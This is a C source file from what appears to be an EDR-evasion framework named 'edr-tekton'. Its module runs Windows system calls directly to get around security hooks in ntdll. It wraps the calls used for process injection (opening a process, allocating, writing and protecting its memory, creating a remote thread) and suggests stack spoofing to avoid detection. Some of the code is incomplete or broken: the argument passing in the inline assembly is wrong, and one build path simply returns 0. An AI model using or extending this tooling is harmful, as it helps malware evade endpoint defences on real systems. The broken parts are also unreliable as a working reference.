/*
 * edr-tekton :: Direct Syscall Module
 * Cat 2.1: Bypass ntdll hooks by executing syscall instruction inline
 *
 * Writes Nt* stubs as:
 *   mov r10, rcx
 *   mov eax, <SSN>
 *   syscall
 *   ret
 *
 * Execution never touches ntdll code, so inline hooks are irrelevant.
 * Trade-off: return address in call stack points to our module, not ntdll.
 * For stack-aware EDRs, combine with indirect syscalls (Cat 2.4) or
 * call stack spoofing (Cat 44).
 */

#include "tekton/modules/syscall.h"
#include "tekton/util/peb.h"
#include "tekton/util/pe.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _DIRECT_SYSCALL_STATE {
    BOOL                initialized;
    TEKTON_SSN_METHOD   ssn_method;
    PVOID               ntdll_base;
} DIRECT_SYSCALL_STATE;

/* Forward declaration for SSN resolver (ssn_resolve.c) */
extern TEKTON_STATUS TektonSsnResolve(
    PVOID, TEKTON_SSN_METHOD, PTEKTON_RESOLVED_STATE
);

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS direct_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    DIRECT_SYSCALL_STATE* state = (DIRECT_SYSCALL_STATE*)malloc(sizeof(DIRECT_SYSCALL_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    /* Default SSN method: Halo's Gate (handles hooked stubs) */
    state->ssn_method = TEKTON_SSN_HALOS_GATE;

    self->private_data = state;

    TLOG_DEBUG("direct_syscall: init");
    return TEKTON_OK;
}

static TEKTON_STATUS direct_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    DIRECT_SYSCALL_STATE* state = (DIRECT_SYSCALL_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("direct_syscall: [DRY RUN] would resolve SSNs via method %d", state->ssn_method);
        return TEKTON_OK;
    }

    /* Get ntdll base for SSN resolution */
    PVOID ntdll_base = TektonPebGetModuleBase(L"ntdll.dll");
    if (!ntdll_base) {
        TLOG_ERROR("direct_syscall: failed to find ntdll.dll");
        return TEKTON_ERR_API_RESOLVE;
    }

    state->ntdll_base = ntdll_base;

    /* Resolve all SSNs using the configured method */
    TEKTON_STATUS status = TektonSsnResolve(
        ntdll_base,
        state->ssn_method,
        &ctx->resolved
    );

    if (status != TEKTON_OK) {
        TLOG_ERROR("direct_syscall: SSN resolution failed (method=%d)", state->ssn_method);
        return status;
    }

    state->initialized = TRUE;

    TLOG_INFO("direct_syscall: SSNs resolved, direct syscall ready");
    return TEKTON_OK;
}

static VOID direct_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(DIRECT_SYSCALL_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD direct_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /* Moderate: bypasses hooks but call stack reveals non-ntdll caller */
    return 35;
}

static BOOL direct_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    /* Direct syscalls require x64 (syscall instruction) */
    return ctx->os.is_x64;
}

/* ── Syscall invocation (inline assembly) ───────────────── */

/*
 * On Windows x64 with MSVC or GCC, execute a direct syscall.
 * The actual syscall instruction runs from our code, not ntdll.
 */

NTSTATUS TektonSyscall(
    PTEKTON_CONTEXT ctx,
    DWORD           ssn,
    DWORD           arg_count,
    ...
) {
    (void)ctx;
    (void)ssn;
    (void)arg_count;

    /*
     * Platform-specific syscall execution.
     * On a real Windows build, this would use inline asm or
     * a pre-assembled stub that does:
     *
     *   mov r10, rcx     ; shadow rcx for kernel
     *   mov eax, <ssn>   ; syscall number
     *   syscall           ; transition to kernel
     *   ret
     *
     * The variadic args are placed in rcx, rdx, r8, r9
     * and on the stack per Windows x64 calling convention.
     *
     * For GCC/Clang x64:
     */

#if defined(_WIN64) && (defined(__GNUC__) || defined(__clang__))
    NTSTATUS result;
    __asm__ volatile (
        "mov %%rcx, %%r10\n"
        "mov %1, %%eax\n"
        "syscall\n"
        : "=a"(result)
        : "r"(ssn)
        : "r10", "r11", "rcx", "memory"
    );
    return result;
#elif defined(_WIN64) && defined(_MSC_VER)
    /* MSVC does not support inline asm on x64.
     * In production, this uses a linked .asm stub.
     * Stub template:
     *   TektonDoSyscall PROC
     *       mov r10, rcx
     *       mov eax, edx      ; SSN passed in edx
     *       syscall
     *       ret
     *   TektonDoSyscall ENDP
     */
    return 0;
#else
    /* Non-Windows dev stub */
    TLOG_DEBUG("TektonSyscall: non-Windows stub (SSN=0x%lX)", (unsigned long)ssn);
    return 0;
#endif
}

/* ── Named syscall wrappers ─────────────────────────────── */

NTSTATUS TektonNtAllocateVirtualMemory(
    PTEKTON_CONTEXT ctx,
    HANDLE ProcessHandle, PVOID* BaseAddress, SIZE_T ZeroBits,
    PSIZE_T RegionSize, DWORD AllocationType, DWORD Protect
) {
    if (!ctx->resolved.ssns_resolved) {
        TLOG_ERROR("SSNs not resolved, cannot invoke syscall");
        return (NTSTATUS)0xC0000001; /* STATUS_UNSUCCESSFUL */
    }

    /*
     * In a production build, this prepares the x64 calling convention:
     *   rcx = ProcessHandle
     *   rdx = BaseAddress
     *   r8  = ZeroBits
     *   r9  = RegionSize
     *   stack = AllocationType, Protect
     * Then invokes TektonSyscall with the correct SSN.
     */

#ifdef _WIN32
    /* Use resolved function pointer if hooks are cleared,
     * or syscall with SSN if doing direct/indirect */
    if (ctx->resolved.fn_nt_allocate_virtual_memory && ctx->resolved.unhook_complete) {
        typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID*, SIZE_T, PSIZE_T, DWORD, DWORD);
        fn_t fn = (fn_t)ctx->resolved.fn_nt_allocate_virtual_memory;
        return fn(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
    }
    return TektonSyscall(ctx, ctx->resolved.ssn_nt_allocate_virtual_memory, 6);
#else
    (void)ProcessHandle; (void)BaseAddress; (void)ZeroBits;
    (void)RegionSize; (void)AllocationType; (void)Protect;
    return 0;
#endif
}

NTSTATUS TektonNtWriteVirtualMemory(
    PTEKTON_CONTEXT ctx,
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten
) {
#ifdef _WIN32
    if (ctx->resolved.fn_nt_write_virtual_memory && ctx->resolved.unhook_complete) {
        typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        fn_t fn = (fn_t)ctx->resolved.fn_nt_write_virtual_memory;
        return fn(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
    }
    return TektonSyscall(ctx, ctx->resolved.ssn_nt_write_virtual_memory, 5);
#else
    (void)ctx; (void)ProcessHandle; (void)BaseAddress; (void)Buffer;
    (void)NumberOfBytesToWrite; (void)NumberOfBytesWritten;
    return 0;
#endif
}

NTSTATUS TektonNtProtectVirtualMemory(
    PTEKTON_CONTEXT ctx,
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    DWORD NewProtect, DWORD* OldProtect
) {
#ifdef _WIN32
    if (ctx->resolved.fn_nt_protect_virtual_memory && ctx->resolved.unhook_complete) {
        typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID*, PSIZE_T, DWORD, DWORD*);
        fn_t fn = (fn_t)ctx->resolved.fn_nt_protect_virtual_memory;
        return fn(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
    }
    return TektonSyscall(ctx, ctx->resolved.ssn_nt_protect_virtual_memory, 5);
#else
    (void)ctx; (void)ProcessHandle; (void)BaseAddress;
    (void)RegionSize; (void)NewProtect; (void)OldProtect;
    return 0;
#endif
}

NTSTATUS TektonNtCreateThreadEx(
    PTEKTON_CONTEXT ctx,
    HANDLE* ThreadHandle, DWORD DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    DWORD CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList
) {
#ifdef _WIN32
    if (ctx->resolved.fn_nt_create_thread_ex && ctx->resolved.unhook_complete) {
        typedef NTSTATUS (NTAPI *fn_t)(HANDLE*, DWORD, PVOID, HANDLE, PVOID, PVOID,
            DWORD, SIZE_T, SIZE_T, SIZE_T, PVOID);
        fn_t fn = (fn_t)ctx->resolved.fn_nt_create_thread_ex;
        return fn(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
            StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
            MaximumStackSize, AttributeList);
    }
    return TektonSyscall(ctx, ctx->resolved.ssn_nt_create_thread_ex, 11);
#else
    (void)ctx; (void)ThreadHandle; (void)DesiredAccess; (void)ObjectAttributes;
    (void)ProcessHandle; (void)StartRoutine; (void)Argument; (void)CreateFlags;
    (void)ZeroBits; (void)StackSize; (void)MaximumStackSize; (void)AttributeList;
    return 0;
#endif
}

NTSTATUS TektonNtOpenProcess(
    PTEKTON_CONTEXT ctx,
    HANDLE* ProcessHandle, DWORD DesiredAccess,
    PVOID ObjectAttributes, PVOID ClientId
) {
#ifdef _WIN32
    if (ctx->resolved.fn_nt_open_process && ctx->resolved.unhook_complete) {
        typedef NTSTATUS (NTAPI *fn_t)(HANDLE*, DWORD, PVOID, PVOID);
        fn_t fn = (fn_t)ctx->resolved.fn_nt_open_process;
        return fn(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    }
    return TektonSyscall(ctx, ctx->resolved.ssn_nt_open_process, 4);
#else
    (void)ctx; (void)ProcessHandle; (void)DesiredAccess;
    (void)ObjectAttributes; (void)ClientId;
    return 0;
#endif
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_direct_syscall = {
    .name           = "direct_syscall",
    .description    = "Direct syscalls via inline assembly stubs (Cat 2.1)",
    .category       = TEKTON_CAT_SYSCALL,
    .target_surface = TEKTON_SURFACE_USER_HOOKS,
    .flags          = TEKTON_MOD_REQUIRES_X64,
    .skill_ref      = "2.1",
    .init           = direct_init,
    .execute        = direct_execute,
    .cleanup        = direct_cleanup,
    .get_risk_score = direct_risk_score,
    .check_compat   = direct_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_direct_syscall);
